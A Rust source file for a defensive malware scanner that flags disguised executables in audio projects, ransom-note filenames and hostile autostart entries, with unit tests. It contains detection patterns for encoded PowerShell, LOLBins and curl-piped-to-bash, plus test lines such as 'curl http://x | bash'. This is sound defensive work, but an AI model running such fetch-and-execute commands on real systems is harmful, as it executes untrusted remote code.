//! Creator-threat and foothold hunter.
//!
//! Samurai's differentiator versus cloud AV suites: detect disguised
//! executables, ransom notes, and hostile persistence **without** rewriting
//! Music / Studio-Projects. Findings are reported only — Amoeba restore stays
//! limited to content infections outside sanctuary.

use crate::samurai_engine::{Finding, Severity};
use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};

const CREATION_EXT: &[&str] = &[
    "wav", "mp3", "flac", "aiff", "aif", "m4a", "ogg", "als", "flp", "cpr", "nki", "fst", "mid",
    "midi",
];

const EXEC_TAIL: &[&str] = &[
    "exe", "scr", "bat", "cmd", "js", "vbs", "ps1", "com", "pif", "msi",
];

fn lower_name(path: &Path) -> String {
    path.file_name()
        .map(|n| n.to_string_lossy().to_lowercase())
        .unwrap_or_default()
}

fn extension_of(name: &str) -> &str {
    name.rsplit_once('.').map(|(_, ext)| ext).unwrap_or("")
}

pub fn is_creation_extension(name: &str) -> bool {
    CREATION_EXT.contains(&extension_of(name))
}

pub fn is_double_exec_extension(name: &str) -> bool {
    let lower = name.to_lowercase();
    let mut parts = lower.split('.').rev();
    let last = parts.next().unwrap_or("");
    let middle = parts.next().unwrap_or("");
    EXEC_TAIL.contains(&last) && (CREATION_EXT.contains(&middle) || middle == "pdf" || middle == "zip" || middle == "docx")
}

pub fn looks_like_ransom_note(name: &str) -> bool {
    let n = name.to_lowercase();
    if n.ends_with(".wav") || n.ends_with(".mp3") || n.ends_with(".flac") {
        return false;
    }
    let clues = [
        "how_to_decrypt",
        "howtodecrypt",
        "decrypt_instructions",
        "files_encrypted",
        "recover_your_files",
        "readme_decrypt",
        "restore-my-files",
        "ransom",
        "_decrypt_",
    ];
    clues.iter().any(|clue| n.contains(clue))
}

pub fn is_windows_pe(header: &[u8]) -> bool {
    header.len() >= 2 && header[0] == b'M' && header[1] == b'Z'
}

pub fn is_elf(header: &[u8]) -> bool {
    header.len() >= 4
        && header[0] == 0x7f
        && header[1] == b'E'
        && header[2] == b'L'
        && header[3] == b'F'
}

pub fn is_macho(header: &[u8]) -> bool {
    matches!(
        header.get(..4),
        Some(&[0xfe, 0xed, 0xfa, 0xce])
            | Some(&[0xce, 0xfa, 0xed, 0xfe])
            | Some(&[0xfe, 0xed, 0xfa, 0xcf])
            | Some(&[0xcf, 0xfa, 0xed, 0xfe])
            | Some(&[0xca, 0xfe, 0xba, 0xbe])
    )
}

pub fn is_executable_payload(header: &[u8]) -> bool {
    is_windows_pe(header) || is_elf(header) || is_macho(header)
}

pub fn read_header(path: &Path, n: usize) -> Option<Vec<u8>> {
    let mut file = fs::File::open(path).ok()?;
    let mut buf = vec![0u8; n];
    let read = file.read(&mut buf).ok()?;
    buf.truncate(read);
    Some(buf)
}

pub fn line_is_hostile(line: &str) -> bool {
    let l = line.to_ascii_lowercase();
    let encoded_ps = l.contains("powershell")
        && (l.contains("-enc")
            || l.contains("-e ")
            || l.contains("frombase64")
            || l.contains("encodedcommand"));
    let living_off_land = l.contains("mshta")
        || l.contains("bitsadmin")
        || (l.contains("regsvr32") && l.contains("/i"))
        || (l.contains("rundll32") && l.contains("javascript"));
    let pipe_shell = (l.contains("curl ") || l.contains("wget ") || l.contains("curl\t") || l.contains("wget\t"))
        && (l.contains("| sh") || l.contains("|sh") || l.contains("| bash") || l.contains("|bash"));
    encoded_ps || living_off_land || pipe_shell
}

fn redact(path: &str, streamer: bool) -> String {
    if !streamer {
        return path.to_string();
    }
    Path::new(path)
        .file_name()
        .map(|n| format!("[STREAM-SHIELD]/{}", n.to_string_lossy()))
        .unwrap_or_else(|| "[STREAM-SHIELD]".into())
}

/// Hunt files inside the scan target. Never mutates them.
pub fn hunt_scan_files(files: &[PathBuf], streamer: bool) -> Vec<Finding> {
    let mut findings = Vec::new();
    for path in files {
        let name = lower_name(path);
        if name.is_empty() {
            continue;
        }
        let shown = redact(&path.to_string_lossy(), streamer);
        if is_double_exec_extension(&name) {
            findings.push(Finding {
                engine: "foothold".into(),
                detail: "Double-extension drop: a creation or document name hiding an executable.".into(),
                path: Some(shown.clone()),
                severity: Severity::Critical,
            });
            continue;
        }
        if looks_like_ransom_note(&name) {
            findings.push(Finding {
                engine: "foothold".into(),
                detail: "Ransom-note filename in the sweep. Samurai will not rewrite sanctuary.".into(),
                path: Some(shown.clone()),
                severity: Severity::High,
            });
        }
        if is_creation_extension(&name) {
            if let Some(header) = read_header(path, 4) {
                if is_executable_payload(&header) {
                    findings.push(Finding {
                        engine: "foothold".into(),
                        detail: "Executable payload disguised as audio or a DAW project. Reported only — creations stay untouched.".into(),
                        path: Some(shown),
                        severity: Severity::Critical,
                    });
                }
            }
        }
    }
    findings
}

fn persistence_dirs(home: &Path) -> Vec<PathBuf> {
    vec![
        home.join(".config/autostart"),
        home.join(".config/systemd/user"),
        home.join("Library/LaunchAgents"),
        home.join("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"),
    ]
}

/// Inspect user persistence. Skipped while `cargo test` compiles this crate so
/// developer autostart files cannot flake engine tests.
pub fn hunt_host_persistence(streamer: bool) -> Vec<Finding> {
    if cfg!(test) {
        return Vec::new();
    }
    let home = std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(PathBuf::from);
    let Some(home) = home else {
        return Vec::new();
    };
    hunt_persistence_in(&home, streamer)
}

pub fn hunt_persistence_in(home: &Path, streamer: bool) -> Vec<Finding> {
    let mut findings = Vec::new();
    for dir in persistence_dirs(home) {
        let Ok(entries) = fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            if !path.is_file() {
                continue;
            }
            let Ok(text) = fs::read_to_string(&path) else {
                continue;
            };
            if text.lines().any(line_is_hostile) {
                findings.push(Finding {
                    engine: "foothold".into(),
                    detail: "Hostile persistence command in a user autostart item.".into(),
                    path: Some(redact(&path.to_string_lossy(), streamer)),
                    severity: Severity::High,
                });
            }
        }
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_wav_exe_double_extension() {
        assert!(is_double_exec_extension("kick.wav.exe"));
        assert!(is_double_exec_extension("Invoice.PDF.SCR"));
        assert!(!is_double_exec_extension("vocal.wav"));
        assert!(!is_double_exec_extension("setup.exe"));
    }

    #[test]
    fn flags_ransom_notes_not_audio() {
        assert!(looks_like_ransom_note("HOW_TO_DECRYPT.txt"));
        assert!(looks_like_ransom_note("README_DECRYPT.html"));
        assert!(!looks_like_ransom_note("decrypt_pad.wav"));
    }

    #[test]
    fn pe_and_elf_headers() {
        assert!(is_windows_pe(b"MZ\x90\x00"));
        assert!(is_elf(b"\x7fELF"));
        assert!(!is_executable_payload(b"RIFF"));
    }

    #[test]
    fn hostile_autostart_lines() {
        assert!(line_is_hostile(
            "Exec=powershell -enc aGVsbG8="
        ));
        assert!(line_is_hostile("Exec=/bin/sh -c 'curl http://x | bash'"));
        assert!(!line_is_hostile("Exec=/usr/bin/firefox %u"));
        assert!(!line_is_hostile("Exec=/usr/bin/steam"));
    }

    #[test]
    fn hunts_disguised_wav_without_rewriting() {
        let dir = std::env::temp_dir().join(format!(
            "samurai-foothold-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
        ));
        fs::create_dir_all(&dir).unwrap();
        let wav = dir.join("vocal.wav");
        fs::write(&wav, b"MZ\x90\x00not-audio").unwrap();
        let hits = hunt_scan_files(&[wav.clone()], false);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].engine, "foothold");
        assert_eq!(fs::read(&wav).unwrap(), b"MZ\x90\x00not-audio");
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn persistence_hunt_flags_encoded_powershell_desktop() {
        let home = std::env::temp_dir().join(format!(
            "samurai-home-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
        ));
        let auto = home.join(".config/autostart");
        fs::create_dir_all(&auto).unwrap();
        fs::write(
            auto.join("update.desktop"),
            "[Desktop Entry]\nExec=powershell -EncodedCommand ZQ==\n",
        )
        .unwrap();
        fs::write(
            auto.join("firefox.desktop"),
            "[Desktop Entry]\nExec=/usr/bin/firefox %u\n",
        )
        .unwrap();
        let hits = hunt_persistence_in(&home, false);
        assert_eq!(hits.len(), 1);
        assert!(hits[0].path.as_ref().unwrap().ends_with("update.desktop"));
        let _ = fs::remove_dir_all(&home);
    }
}
